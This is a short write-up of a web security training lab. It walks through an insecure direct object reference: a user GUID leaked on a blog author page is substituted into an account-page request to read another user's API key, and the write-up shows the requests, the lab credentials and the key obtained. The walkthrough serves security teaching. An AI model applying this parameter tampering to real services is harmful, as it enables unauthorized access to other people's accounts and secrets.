### Lab 6 User ID controlled by request parameter, with unpredictable user IDs  
**Apprentice**

---

#### Mission Description  
The lab has a horizontal privilege escalation issue on the account page. Users are identified by GUIDs instead of simple IDs.  

---

#### Mission Objective  
Find **Carlos’s GUID**, use it in the request to `/my-account`, and grab his API key.  

---

#### Steps  
1. Log in with the given credentials:  

wiener:peter

2. Go to **My Account** and notice the request:  

GET /my-account?id=cee1597a-9c83-4a1c-ac33-eae19ca390d9 HTTP/2

→ Response shows your username (wiener) and your API key.  
3. Explore the **Blogs** section.  
4. Click on an author’s profile → notice the URL leaks a **GUID**:  

/blogs?userId=391f068a-1c52-47a1-bc1e-98f479bd9dd0

5. That post was published by **Carlos** → his GUID is exposed here.  
6. Replace the `id` parameter in the `/my-account` request with Carlos’s GUID:  

GET /my-account?id=391f068a-1c52-47a1-bc1e-98f479bd9dd0

7. Response shows:  

Your username is: carlos
Your API Key is: 4IA8tQ6B6zMFPbOVGUeVW3bv5aJzePMt


---

#### Final Step  

GET /my-account?id=391f068a-1c52-47a1-bc1e-98f479bd9dd0 HTTP/2


---

#### Notes  
- Even though GUIDs look unpredictable, if they’re exposed elsewhere (like blogs/authors), attackers can still harvest them.  
- Always validate ownership server-side instead of trusting user-supplied IDs.  

---

**Status: Solved ✅**

